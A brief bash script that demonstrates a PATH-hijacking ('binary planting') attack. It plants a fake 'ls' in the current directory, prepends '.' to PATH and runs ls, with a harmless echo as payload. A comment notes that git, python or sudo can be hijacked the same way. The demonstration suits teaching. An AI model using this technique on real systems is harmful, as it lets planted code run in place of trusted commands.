#!/usr/bin/bash

# Called a basic binary planting attack
echo -e '#!/bin/bash\n echo "MALICIOUS CODE EXECUTED"' > ./ls
chmod +x ./ls

export PATH=.:$PATH
ls

# just an example of an attack script, it's dependant on the user running ls, similar scripts can be used to hijack git / python / sudo etc.
